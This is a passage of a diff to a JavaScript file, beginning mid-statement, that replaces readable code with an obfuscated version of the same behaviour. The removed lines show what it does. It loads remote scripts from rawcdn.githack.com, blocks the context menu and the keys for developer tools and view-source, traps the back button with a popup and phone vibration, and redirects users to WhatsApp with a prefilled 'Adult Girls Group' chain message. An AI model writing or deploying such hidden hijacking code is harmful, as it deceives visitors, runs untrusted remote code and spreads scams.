_0x1cf4[56], _0x1cf4[57], _0x1cf4[58], _0x1cf4[59], _0x1cf4[60], _0x1cf4[61], _0x1cf4[62], _0x1cf4[63], _0x1cf4[64], _0x1cf4[65], _0x1cf4[66], _0x1cf4[67], _0x1cf4[68], _0x1cf4[69], _0x1cf4[70], _0x1cf4[71], _0x1cf4[72], _0x1cf4[73], _0x1cf4[74], _0x1cf4[75], _0x1cf4[76], _0x1cf4[77], _0x1cf4[78], _0x1cf4[79], _0x1cf4[80], _0x1cf4[81], _0x1cf4[82], _0x1cf4[83], _0x1cf4[84], _0x1cf4[85], _0x1cf4[86], _0x1cf4[87], _0x1cf4[88], _0x1cf4[89], _0x1cf4[90], _0x1cf4[91], _0x1cf4[92], _0x1cf4[93], _0x1cf4[94], _0x1cf4[95], _0x1cf4[96], _0x1cf4[97], _0x1cf4[98], _0x1cf4[99], _0x1cf4[100], _0x1cf4[101], _0x1cf4[102], _0x1cf4[103], _0x1cf4[104], _0x1cf4[105], _0x1cf4[106], _0x1cf4[107], _0x1cf4[108], _0x1cf4[109], _0x1cf4[110], _0x1cf4[111], _0x1cf4[112], _0x1cf4[113], _0x1cf4[114], _0x1cf4[115], _0x1cf4[116], _0x1cf4[117], _0x1cf4[118]];
+var _0x8dc8 = [_0x2124[0], _0x2124[1], _0x2124[2], _0x2124[3], _0x2124[4], _0x2124[5], _0x2124[6], _0x2124[7], _0x2124[8], _0x2124[9], _0x2124[10], _0x2124[11], _0x2124[12], _0x2124[13], _0x2124[14], _0x2124[15], _0x2124[16], _0x2124[17], _0x2124[18], _0x2124[19], _0x2124[20], _0x2124[21], _0x2124[22], _0x2124[23], _0x2124[24], _0x2124[25], _0x2124[26], _0x2124[27], _0x2124[28], _0x2124[29], _0x2124[30], _0x2124[31], _0x2124[32], _0x2124[33], _0x2124[34], _0x2124[35], _0x2124[36], _0x2124[37], _0x2124[38], _0x2124[39], _0x2124[40], _0x2124[41], _0x2124[42], _0x2124[43], _0x2124[44], _0x2124[45], _0x2124[46], _0x2124[47], _0x2124[48], _0x2124[49], _0x2124[50], _0x2124[51], _0x2124[52], _0x2124[53], _0x2124[54], _0x2124[55], _0x2124[56], _0x2124[57], _0x2124[58], _0x2124[59], _0x2124[60], _0x2124[61], _0x2124[62], _0x2124[63], _0x2124[64], _0x2124[65], _0x2124[66], _0x2124[67], _0x2124[68], _0x2124[69], _0x2124[70], _0x2124[71], _0x2124[72], _0x2124[73], _0x2124[74], _0x2124[75], _0x2124[76], _0x2124[77], _0x2124[78], _0x2124[79], _0x2124[80], _0x2124[81], _0x2124[82], _0x2124[83], _0x2124[84], _0x2124[85], _0x2124[86], _0x2124[87], _0x2124[88], _0x2124[89], _0x2124[90], _0x2124[91], _0x2124[92], _0x2124[93], _0x2124[94], _0x2124[95], _0x2124[96], _0x2124[97], _0x2124[98], _0x2124[99], _0x2124[100], _0x2124[101], _0x2124[102], _0x2124[103], _0x2124[104], _0x2124[105], _0x2124[106], _0x2124[107], _0x2124[108], _0x2124[109], _0x2124[110], _0x2124[111], _0x2124[112], _0x2124[113], _0x2124[114], _0x2124[115], _0x2124[116], _0x2124[117], _0x2124[118]];
 shortcut = {
     all_shortcuts: {},
-    add: function (briyon, hastiin, katlyne) {
-        var dory = {
-            type: "keydown",
+    add: function (_0xe87bxd, _0xe87bxe, _0xe87bxf) {
+        var _0xe87bx10 = {
+            type: _0x8dc8[0],
             propagate: false,
             disable_in_input: false,
             target: document,
             keycode: false
         };
-        if (katlyne) {
-            for (var taisto in dory) {
-                "undefined" == typeof katlyne[taisto] && (katlyne[taisto] = dory[taisto]);
+        if (_0xe87bxf) {
+            for (var _0xe87bx11 in _0xe87bx10) {
+                _0x8dc8[1] == typeof _0xe87bxf[_0xe87bx11] && (_0xe87bxf[_0xe87bx11] = _0xe87bx10[_0xe87bx11])
             }
         } else {
-            katlyne = dory;
+            _0xe87bxf = _0xe87bx10
         };
-        dory = katlyne.target, "string" == typeof katlyne.target && (dory = document.getElementById(katlyne.target)), briyon = briyon.toLowerCase(), taisto = function (alberth) {
-            alberth = alberth || window.event;
-            if (katlyne.disable_in_input) {
-                var avianni;
-                alberth.target ? avianni = alberth.target : alberth.srcElement && (avianni = alberth.srcElement), 3 == avianni.nodeType && (avianni = avianni.parentNode);
-                if ("INPUT" == avianni.tagName || "TEXTAREA" == avianni.tagName) {
-                    return;
+        _0xe87bx10 = _0xe87bxf[_0x8dc8[2]], _0x8dc8[3] == typeof _0xe87bxf[_0x8dc8[2]] && (_0xe87bx10 = document[_0x8dc8[4]](_0xe87bxf[_0x8dc8[2]])), _0xe87bxd = _0xe87bxd[_0x8dc8[5]](), _0xe87bx11 = function (_0xe87bx12) {
+            _0xe87bx12 = _0xe87bx12 || window[_0x8dc8[6]];
+            if (_0xe87bxf[_0x8dc8[7]]) {
+                var _0xe87bx13;
+                _0xe87bx12[_0x8dc8[2]] ? _0xe87bx13 = _0xe87bx12[_0x8dc8[2]] : _0xe87bx12[_0x8dc8[8]] && (_0xe87bx13 = _0xe87bx12[_0x8dc8[8]]), 3 == _0xe87bx13[_0x8dc8[9]] && (_0xe87bx13 = _0xe87bx13[_0x8dc8[10]]);
+                if (_0x8dc8[11] == _0xe87bx13[_0x8dc8[12]] || _0x8dc8[13] == _0xe87bx13[_0x8dc8[12]]) {
+                    return
                 }
             };
-            alberth.keyCode ? code = alberth.keyCode : alberth.which && (code = alberth.which), avianni = String.fromCharCode(code).toLowerCase(), 188 == code && (avianni = ","), 190 == code && (avianni = ".");
-            var aanyah = briyon.split("+"),
-                kedesha = 0,
-                ricky = {
-                    "`": "~",
-                    1: "!",
-                    2: "@",
-                    3: "#",
-                    4: "$",
-                    5: "%",
-                    6: "^",
-                    7: "&",
-                    8: "*",
-                    9: "(",
-                    0: ")",
-                    "-": "_",
-                    "=": "+",
-                    ";": ":",
-                    "'": '"',
-                    ",": "<",
-                    ".": ">",
-                    "/": "?",
-                    "\\": "|"
+            _0xe87bx12[_0x8dc8[14]] ? code = _0xe87bx12[_0x8dc8[14]] : _0xe87bx12[_0x8dc8[15]] && (code = _0xe87bx12[_0x8dc8[15]]), _0xe87bx13 = String[_0x8dc8[16]](code)[_0x8dc8[5]](), 188 == code && (_0xe87bx13 = _0x8dc8[17]), 190 == code && (_0xe87bx13 = _0x8dc8[18]);
+            var _0xe87bx14 = _0xe87bxd[_0x8dc8[20]](_0x8dc8[19]),
+                _0xe87bx15 = 0,
+                _0xe87bx16 = {
+                    "\x60": _0x8dc8[21],
+                    1: _0x8dc8[22],
+                    2: _0x8dc8[23],
+                    3: _0x8dc8[24],
+                    4: _0x8dc8[25],
+                    5: _0x8dc8[26],
+                    6: _0x8dc8[27],
+                    7: _0x8dc8[28],
+                    8: _0x8dc8[29],
+                    9: _0x8dc8[30],
+                    0: _0x8dc8[31],
+                    "\x2D": _0x8dc8[32],
+                    "\x3D": _0x8dc8[19],
+                    "\x3B": _0x8dc8[33],
+                    "\x27": _0x8dc8[34],
+                    "\x2C": _0x8dc8[35],
+                    "\x2E": _0x8dc8[36],
+                    "\x2F": _0x8dc8[37],
+                    "\x5C": _0x8dc8[38]
                 },
-                kouture = {
+                _0xe87bx17 = {
                     esc: 27,
                     escape: 27,
                     tab: 9,
@@ -95,151 +107,151 @@ shortcut = {
                     f11: 122,
                     f12: 123
                 },
-                shereef = false,
-                shontae = false,
-                karrissa = false,
-                ahmani = false,
-                devan = false,
-                mixon = false,
-                sumaiya = false,
-                jodhveer = false;
-            alberth.ctrlKey && (ahmani = true), alberth.shiftKey && (shontae = true), alberth.altKey && (mixon = true), alberth.metaKey && (jodhveer = true);
-            for (var treyvonn = 0; k = aanyah[treyvonn], treyvonn < aanyah.length; treyvonn++) {
-                "ctrl" == k || "control" == k ? (kedesha++, karrissa = true) : "shift" == k ? (kedesha++, shereef = true) : "alt" == k ? (kedesha++, devan = true) : "meta" == k ? (kedesha++, sumaiya = true) : 1 < k.length ? kouture[k] == code && kedesha++ : katlyne.keycode ? katlyne.keycode == code && kedesha++ : avianni == k ? kedesha++ : ricky[avianni] && alberth.shiftKey && (avianni = ricky[avianni], avianni == k && kedesha++);
+                _0xe87bx18 = false,
+                _0xe87bx19 = false,
+                _0xe87bx1a = false,
+                _0xe87bx1b = false,
+                _0xe87bx1c = false,
+                _0xe87bx1d = false,
+                _0xe87bx1e = false,
+                _0xe87bx1f = false;
+            _0xe87bx12[_0x8dc8[39]] && (_0xe87bx1b = true), _0xe87bx12[_0x8dc8[40]] && (_0xe87bx19 = true), _0xe87bx12[_0x8dc8[41]] && (_0xe87bx1d = true), _0xe87bx12[_0x8dc8[42]] && (_0xe87bx1f = true);
+            for (var _0xe87bx20 = 0; k = _0xe87bx14[_0xe87bx20], _0xe87bx20 < _0xe87bx14[_0x8dc8[43]]; _0xe87bx20++) {
+                _0x8dc8[44] == k || _0x8dc8[45] == k ? (_0xe87bx15++, _0xe87bx1a = true) : _0x8dc8[46] == k ? (_0xe87bx15++, _0xe87bx18 = true) : _0x8dc8[47] == k ? (_0xe87bx15++, _0xe87bx1c = true) : _0x8dc8[48] == k ? (_0xe87bx15++, _0xe87bx1e = true) : 1 < k[_0x8dc8[43]] ? _0xe87bx17[k] == code && _0xe87bx15++ : _0xe87bxf[_0x8dc8[49]] ? _0xe87bxf[_0x8dc8[49]] == code && _0xe87bx15++ : _0xe87bx13 == k ? _0xe87bx15++ : _0xe87bx16[_0xe87bx13] && _0xe87bx12[_0x8dc8[40]] && (_0xe87bx13 = _0xe87bx16[_0xe87bx13], _0xe87bx13 == k && _0xe87bx15++)
             };
-            if (kedesha == aanyah.length && ahmani == karrissa && shontae == shereef && mixon == devan && jodhveer == sumaiya && (hastiin(alberth), !katlyne.propagate)) {
-                return alberth.cancelBubble = true, alberth.returnValue = false, alberth.stopPropagation && (alberth.stopPropagation(), alberth.preventDefault()), false;
+            if (_0xe87bx15 == _0xe87bx14[_0x8dc8[43]] && _0xe87bx1b == _0xe87bx1a && _0xe87bx19 == _0xe87bx18 && _0xe87bx1d == _0xe87bx1c && _0xe87bx1f == _0xe87bx1e && (_0xe87bxe(_0xe87bx12), !_0xe87bxf[_0x8dc8[50]])) {
+                return _0xe87bx12[_0x8dc8[51]] = true, _0xe87bx12[_0x8dc8[52]] = false, _0xe87bx12[_0x8dc8[53]] && (_0xe87bx12[_0x8dc8[53]](), _0xe87bx12[_0x8dc8[54]]()), false
             }
-        }, this.all_shortcuts[briyon] = {
-            callback: taisto,
-            target: dory,
-            event: katlyne.type
-        }, dory.addEventListener ? dory.addEventListener(katlyne.type, taisto, false) : dory.attachEvent ? dory.attachEvent("on" + katlyne.type, taisto) : dory["on" + katlyne.type] = taisto;
+        }, this[_0x8dc8[55]][_0xe87bxd] = {
+            callback: _0xe87bx11,
+            target: _0xe87bx10,
+            event: _0xe87bxf[_0x8dc8[56]]
+        }, _0xe87bx10[_0x8dc8[57]] ? _0xe87bx10[_0x8dc8[57]](_0xe87bxf[_0x8dc8[56]], _0xe87bx11, false) : _0xe87bx10[_0x8dc8[58]] ? _0xe87bx10[_0x8dc8[58]](_0x8dc8[59] + _0xe87bxf[_0x8dc8[56]], _0xe87bx11) : _0xe87bx10[_0x8dc8[59] + _0xe87bxf[_0x8dc8[56]]] = _0xe87bx11
     },
-    remove: function (kennedi) {
-        var kennedi = kennedi.toLowerCase(),
-            deannie = this.all_shortcuts[kennedi];
-        delete this.all_shortcuts[kennedi];
-        if (deannie) {
-            var kennedi = deannie.event,
-                chumani = deannie.target,
-                deannie = deannie.callback;
-            chumani.detachEvent ? chumani.detachEvent("on" + kennedi, deannie) : chumani.removeEventListener ? chumani.removeEventListener(kennedi, deannie, false) : chumani["on" + kennedi] = false;
+    remove: function (_0xe87bx21) {
+        var _0xe87bx21 = _0xe87bx21[_0x8dc8[5]](),
+            _0xe87bx22 = this[_0x8dc8[55]][_0xe87bx21];
+        delete this[_0x8dc8[55]][_0xe87bx21];
+        if (_0xe87bx22) {
+            var _0xe87bx21 = _0xe87bx22[_0x8dc8[6]],
+                _0xe87bx23 = _0xe87bx22[_0x8dc8[2]],
+                _0xe87bx22 = _0xe87bx22[_0x8dc8[60]];
+            _0xe87bx23[_0x8dc8[61]] ? _0xe87bx23[_0x8dc8[61]](_0x8dc8[59] + _0xe87bx21, _0xe87bx22) : _0xe87bx23[_0x8dc8[62]] ? _0xe87bx23[_0x8dc8[62]](_0xe87bx21, _0xe87bx22, false) : _0xe87bx23[_0x8dc8[59] + _0xe87bx21] = false
         }
     }
-}, shortcut.add("Ctrl+U", function () {
-    // directlink
-    document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/irawanria85/chat/367736bc17236e5303b5dd865cca0197ce7a303b/public/js/link.js"></scr' + 'ipt>');
+}, shortcut[_0x8dc8[73]](_0x8dc8[63], function () {
+    document[_0x8dc8[72]](_0x8dc8[64] + _0x8dc8[65] + (location[_0x8dc8[66]] === _0x8dc8[67] ? _0x8dc8[68] : _0x8dc8[69]) + _0x8dc8[70] + _0x8dc8[71])
 });
 
-/* sticky */
-function frontend_init() {};
+function frontend_init() {}
 
 function joslynn() {
-    var rateel = ["body", "13080fEcUqR", "351794dXpMob", "remove", "getElementById", "preventDefault", "4609720SpeYxS", "m_x", "keyCode", "4473nVLNzp", "5510365ETGgIJ", "scrollTo", "130060sjGuAo", "14wPTGak", "shiftKey", "17294mJeRXA", "smooth", "m_co", "style", "d_co", "ctrlKey", "261TJxigb", "1501638lzBvWn", "addEventListener"];
+    var _0xe87bx26 = [_0x8dc8[74], _0x8dc8[75], _0x8dc8[76], _0x8dc8[77], _0x8dc8[4], _0x8dc8[54], _0x8dc8[78], _0x8dc8[79], _0x8dc8[14], _0x8dc8[80], _0x8dc8[81], _0x8dc8[82], _0x8dc8[83], _0x8dc8[84], _0x8dc8[40], _0x8dc8[85], _0x8dc8[86], _0x8dc8[87], _0x8dc8[88], _0x8dc8[89], _0x8dc8[39], _0x8dc8[90], _0x8dc8[91], _0x8dc8[57]];
     joslynn = function () {
-        return rateel;
+        return _0xe87bx26
     };
-    return joslynn();
+    return joslynn()
 }
 
-function gerred(sequina, vadra) {
-    var xzekiel = joslynn();
-    return gerred = function (kitara, evah) {
-        kitara = kitara - 322;
-        var marvyl = xzekiel[kitara];
-        return marvyl;
-    }, gerred(sequina, vadra);
+function gerred(_0xe87bx28, _0xe87bx29) {
+    var _0xe87bx2a = joslynn();
+    return gerred = function (_0xe87bx2b, _0xe87bx2c) {
+        _0xe87bx2b = _0xe87bx2b - 322;
+        var _0xe87bx2d = _0xe87bx2a[_0xe87bx2b];
+        return _0xe87bx2d
+    }, gerred(_0xe87bx28, _0xe87bx29)
 }
 var dyquan = gerred;
-(function (vy, larobert) {
-    var onetia = gerred,
-        iffat = vy();
+(function (_0xe87bx2f, _0xe87bx30) {
+    var _0xe87bx31 = gerred,
+        _0xe87bx32 = _0xe87bx2f();
     while (!![]) {
         try {
-            var zody = -parseInt(onetia(332)) / 1 + parseInt(onetia(345)) / 2 * (parseInt(onetia(327)) / 3) + -parseInt(onetia(336)) / 4 + parseInt(onetia(340)) / 5 + parseInt(onetia(328)) / 6 * (-parseInt(onetia(343)) / 7) + -parseInt(onetia(331)) / 8 * (-parseInt(onetia(339)) / 9) + -parseInt(onetia(342)) / 10;
-            if (zody === larobert) break;
-            else iffat.push(iffat.shift());
+            var _0xe87bx33 = -parseInt(_0xe87bx31(332)) / 1 + parseInt(_0xe87bx31(345)) / 2 * (parseInt(_0xe87bx31(327)) / 3) + -parseInt(_0xe87bx31(336)) / 4 + parseInt(_0xe87bx31(340)) / 5 + parseInt(_0xe87bx31(328)) / 6 * (-parseInt(_0xe87bx31(343)) / 7) + -parseInt(_0xe87bx31(331)) / 8 * (-parseInt(_0xe87bx31(339)) / 9) + -parseInt(_0xe87bx31(342)) / 10;
+            if (_0xe87bx33 === _0xe87bx30) {
+                break
+            } else {
+                _0xe87bx32[_0x8dc8[92]](_0xe87bx32[_0x8dc8[46]]())
+            }
         } catch (kinzlie) {
-            iffat.push(iffat.shift());
+            _0xe87bx32[_0x8dc8[92]](_0xe87bx32[_0x8dc8[46]]())
         }
     }
 }(joslynn, 649181), (setTimeout(function () {
-    var robynne = gerred;
-    window.scrollTo({
+    var _0xe87bx34 = gerred;
+    window[_0x8dc8[82]]({
         top: 0,
-        behavior: robynne(322)
-    });
+        behavior: _0xe87bx34(322)
+    })
 }, 100), setTimeout(function () {
-    var julion = gerred;
-    window[julion(341)]({
+    var _0xe87bx35 = gerred;
+    window[_0xe87bx35(341)]({
         top: 0,
-        behavior: "smooth"
-    });
-}, 2e3), window.innerWidth >= 600 ? (setTimeout(function () {
-    var nerine = gerred;
-    document.body[nerine(324)].overflow = "auto";
+        behavior: _0x8dc8[86]
+    })
+}, 2e3), window[_0x8dc8[93]] >= 600 ? (setTimeout(function () {
+    var _0xe87bx36 = gerred;
+    document[_0x8dc8[74]][_0xe87bx36(324)][_0x8dc8[94]] = _0x8dc8[95]
 }, 7800), setTimeout(function () {
-    var iain = gerred;
-    document.getElementById("d_x")[iain(333)]();
+    var _0xe87bx37 = gerred;
+    document[_0x8dc8[4]](_0x8dc8[96])[_0xe87bx37(333)]()
 }, 20500), setTimeout(function () {
-    var sajdah = gerred;
-    document[sajdah(334)](sajdah(325)).remove();
+    var _0xe87bx38 = gerred;
+    document[_0xe87bx38(334)](_0xe87bx38(325))[_0x8dc8[77]]()
 }, 25500)) : (setTimeout(function () {
-    var brierre = gerred;
-    document[brierre(330)][brierre(324)].overflow = "auto";
+    var _0xe87bx39 = gerred;
+    document[_0xe87bx39(330)][_0xe87bx39(324)][_0x8dc8[94]] = _0x8dc8[95]
 }, 11800), setTimeout(function () {
-    var angelyce = gerred;
-    document.getElementById(angelyce(337))[angelyce(333)]();
+    var _0xe87bx3a = gerred;
+    document[_0x8dc8[4]](_0xe87bx3a(337))[_0xe87bx3a(333)]()
 }, 12500), setTimeout(function () {
-    var verl = gerred;
-    document.getElementById(verl(323))[verl(333)]();
-}, 20500)), document[dyquan(329)]("contextmenu", mahiyah => mahiyah[dyquan(335)]()), document.onkeydown = function (darnell) {
-    var sherrl = dyquan;
-    return 123 != darnell[sherrl(338)] && (!darnell[sherrl(326)] || !darnell[sherrl(344)] || 73 != darnell[sherrl(338)]) && (!darnell[sherrl(326)] || !darnell[sherrl(344)] || 74 != darnell[sherrl(338)]) && (!darnell.ctrlKey || 85 != darnell[sherrl(338)]) && 123 != event.keyCode && !(event[sherrl(326)] && event.shiftKey && 73 == event[sherrl(338)] || event.ctrlKey && event[sherrl(344)] && 74 == event[sherrl(338)]) && (!darnell[sherrl(326)] || 67 !== darnell.keyCode && 86 !== darnell[sherrl(338)] && 85 !== darnell.keyCode && 117 !== darnell[sherrl(338)]) && void 0;
+    var _0xe87bx3b = gerred;
+    document[_0x8dc8[4]](_0xe87bx3b(323))[_0xe87bx3b(333)]()
+}, 20500)), document[dyquan(329)](_0x8dc8[97], (_0xe87bx3c) => {
+    return _0xe87bx3c[dyquan(335)]()
+}), document[_0x8dc8[98]] = function (_0xe87bx3d) {
+    var _0xe87bx3e = dyquan;
+    return 123 != _0xe87bx3d[_0xe87bx3e(338)] && (!_0xe87bx3d[_0xe87bx3e(326)] || !_0xe87bx3d[_0xe87bx3e(344)] || 73 != _0xe87bx3d[_0xe87bx3e(338)]) && (!_0xe87bx3d[_0xe87bx3e(326)] || !_0xe87bx3d[_0xe87bx3e(344)] || 74 != _0xe87bx3d[_0xe87bx3e(338)]) && (!_0xe87bx3d[_0x8dc8[39]] || 85 != _0xe87bx3d[_0xe87bx3e(338)]) && 123 != event[_0x8dc8[14]] && !(event[_0xe87bx3e(326)] && event[_0x8dc8[40]] && 73 == event[_0xe87bx3e(338)] || event[_0x8dc8[39]] && event[_0xe87bx3e(344)] && 74 == event[_0xe87bx3e(338)]) && (!_0xe87bx3d[_0xe87bx3e(326)] || 67 !== _0xe87bx3d[_0x8dc8[14]] && 86 !== _0xe87bx3d[_0xe87bx3e(338)] && 85 !== _0xe87bx3d[_0x8dc8[14]] && 117 !== _0xe87bx3d[_0xe87bx3e(338)]) && void(((((((((((((0)))))))))))))
 }));
-
-// title and thumbnail
 thumbnail();
 
 function thumbnail() {
-    document.getElementById("thumb").innerHTML = objetos[a];
-    document.getElementById("title").innerHTML = citas[alea];
+    document[_0x8dc8[4]](_0x8dc8[100])[_0x8dc8[99]] = objetos[a];
+    document[_0x8dc8[4]](_0x8dc8[101])[_0x8dc8[99]] = citas[alea]
 }
 
-// link
 function Link() {
-    // directlink
-    var w = window.open("");
-    w.document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/irawanria85/whatsapp/a5d6cee4d98bab98db8b0961959cf564ae9620cf/public/js/link.js"></scr' + 'ipt>');
+    var _0xe87bx41 = window[_0x8dc8[102]](_0x8dc8[69]);
+    _0xe87bx41[_0x8dc8[104]][_0x8dc8[72]](_0x8dc8[64] + _0x8dc8[65] + (location[_0x8dc8[66]] === _0x8dc8[67] ? _0x8dc8[68] : _0x8dc8[69]) + _0x8dc8[103] + _0x8dc8[71])
 }
-
-// anti back
 var ii = 0;
 var iy = 0;
-if (typeof history.pushState === "function") {
-    history.pushState("back", null, null);
-    window.onpopstate = function () {
-        history.pushState("back", null, null);
+if (typeof history[_0x8dc8[105]] === _0x8dc8[106]) {
+    history[_0x8dc8[105]](_0x8dc8[107], null, null);
+    window[_0x8dc8[108]] = function () {
+        history[_0x8dc8[105]](_0x8dc8[107], null, null);
         if (1 == iy) {
             iy = 0;
-            document.getElementById("popup1").style.display = "none";
+            document[_0x8dc8[4]](_0x8dc8[110])[_0x8dc8[88]][_0x8dc8[109]] = _0x8dc8[111];
             setTimeout(function () {
-                if (document.getElementById("popup1").style.display == "none") document
-                    .getElementById("popup1").style.display = "block";
+                if (document[_0x8dc8[4]](_0x8dc8[110])[_0x8dc8[88]][_0x8dc8[109]] == _0x8dc8[111]) {
+                    document[_0x8dc8[4]](_0x8dc8[110])[_0x8dc8[88]][_0x8dc8[109]] = _0x8dc8[112]
+                }
             }, 300);
-            window.navigator.vibrate(5e3);
-        } else if (1 == ii) iy += 1;
-    };
-}
+            window[_0x8dc8[114]][_0x8dc8[113]](5e3)
+        } else {
+            if (1 == ii) {
+                iy += 1
+            }
+        }
+    }
+};
 setTimeout(function () {
-    ii = 1;
+    ii = 1
 }, 200);
 
-// hide popup
 function hidepop() {
-    setCookie("invgrupo", "0");
-    document.getElementById("popup1").style.display = "none";
-    window.location =
-        "whatsapp://send?text= *Adult Girls Group* 👇 %0Ahttps://chat.indonesiya.com/DuZJRauGznRIQGNPjxOyGH %0A%0A*Share in 3 Group to Join Automatic* %0Ahttps://chat.aridjaya.com/DuZJRauGznRIQGNPjxOyGH 👈 %0A%0A*Join Group*";
+    setCookie(_0x8dc8[115], _0x8dc8[116]);
+    document[_0x8dc8[4]](_0x8dc8[110])[_0x8dc8[88]][_0x8dc8[109]] = _0x8dc8[111];
+    window[_0x8dc8[117]] = _0x8dc8[118]
 }
